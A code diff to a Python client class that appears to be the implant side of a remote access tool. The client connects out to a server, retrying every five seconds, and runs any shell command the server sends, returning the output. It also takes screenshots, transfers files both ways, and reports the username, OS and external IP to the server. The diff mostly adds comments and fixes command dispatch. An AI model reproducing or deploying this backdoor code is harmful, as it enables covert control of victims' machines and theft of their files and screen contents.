@@ -27,9 +27,11 @@ class Client(object):
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
 
+    # removing the screenshot file
     def removeScreenshot(self):
         Path(self.screenshotPath).unlink(missing_ok=True)
 
+    # receiving a file from server side (upload)
     def upload(self, args):
         header = loads(self.__Client.recv(512))
         try:
@@ -39,8 +41,9 @@ class Client(object):
         except PermissionError:
             self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
+    # taking a screenshot
     def screenshot(self, args):
-        grab().save(self.screenshotPath)
+        grab().save(self.screenshotPath) # taking and saving the screnshot
         namefile, extension, file = self.splitFile(self.screenshotPath);del(namefile)
         self.removeScreenshot()
         
@@ -54,10 +57,11 @@ class Client(object):
         self.__Client.send(dumps(header))
         sleep(1)
         self.__Client.send(file)
-
+    
+    # sending a local file to server side (download)
     def download(self, args):
         try:
-            if Path(args).is_file():
+            if Path(args).is_file(): # if file exists
                 namefile, extension, file = self.splitFile(args)
                 header = {
                     "namefile": namefile,
@@ -76,10 +80,12 @@ class Client(object):
         except PermissionError:
             self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
+    # saving a received file from server side 
     def saveReceivedFile(self, path, content):
         with open(path, 'wb') as receivedFile:
             receivedFile.write(content)
 
+    # receiving a file from server side (upload)
     def receiveFile(self, header):
         file = b''
 
@@ -88,13 +94,16 @@ class Client(object):
 
         self.saveReceivedFile(f'{header["namefile"]}{header["extension"]}', file)
 
+    # returns name of file, extension and your bytes content
     def splitFile(self, path):
         with open(path, 'rb') as file:
             return Path(path).stem, Path(path).suffix, file.read()
 
+    # send header to server side (about messages, files...)
     def sendHeader(self, header):
         self.__Client.send(dumps(header))
 
+    # changing to the directory, informed from the server side
     def changeDirectory(self, directory):
         try:
             chdir(directory)
@@ -105,6 +114,7 @@ class Client(object):
         except FileNotFoundError:
             self.sendCommand(self.lastCommand)
 
+    # returns all 'internal' commands
     def allCommands(self):
         return {
             "/screenshot": {"action": self.screenshot},
@@ -113,15 +123,18 @@ class Client(object):
             "cd": {"action":  self.changeDirectory}
         }
 
+    # returns function of the command (your action) and your respective arguments, if exists, if not returns False (is a shell command).
     def splitCommand(self, command):
         if self.allCommands().get(command.split()[0]):
-            return self.allCommands()[command.split()[0]], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #
+            return self.allCommands()[command.split()[0]]['action'], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #
 
-        return False, ''.join(f'{cmd} ' for cmd in command.split()[1:])
+        return False
 
+    # returns output of the command informed
     def outputCommand(self, command):
         return getoutput(command).encode()
 
+    # sending the command output that was executed in shell
     def sendCommand(self, command, customOutput=''):
         if not customOutput:
             output = self.outputCommand(command)
@@ -138,14 +151,16 @@ class Client(object):
         sleep(0.5)
         self.__Client.send(output)
 
+    # checking and executing command informed by server side
     def runCommand(self, cmd):
         command, args = self.splitCommand(cmd)
 
         if command:
-            command['action'](args.strip())
+            command(args.strip())
         else:
-            self.sendCommand(cmd)
+            self.sendCommand(cmd) # send the output of shell command
 
+    # receiving server side commands
     def listenServer(self):
         while True:
             command = self.__Client.recv(512)
@@ -155,6 +170,7 @@ class Client(object):
             else:
                 self.run()
 
+    # returns some basic data about client
     def identifier(self):
         try:
             eAddress = get('https://api.ipify.org?format=text').content.decode()
@@ -163,6 +179,7 @@ class Client(object):
         
         return dumps({"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "externalAddress": eAddress, "currentDirectory": getcwd()})
 
+    # trying to connect to the server
     def connect(self):
         try:
             self.__Client.connect((self.__Address))
@@ -171,9 +188,11 @@ class Client(object):
         except ConnectionRefusedError:
             sleep(5);self.connect()
 
+    # configuring the socket object
     def configureSocket(self):
         self.__Client = socket(AF_INET, SOCK_STREAM)
 
+    # starting the program
     def run(self):
         self.configureSocket()
         self.connect()
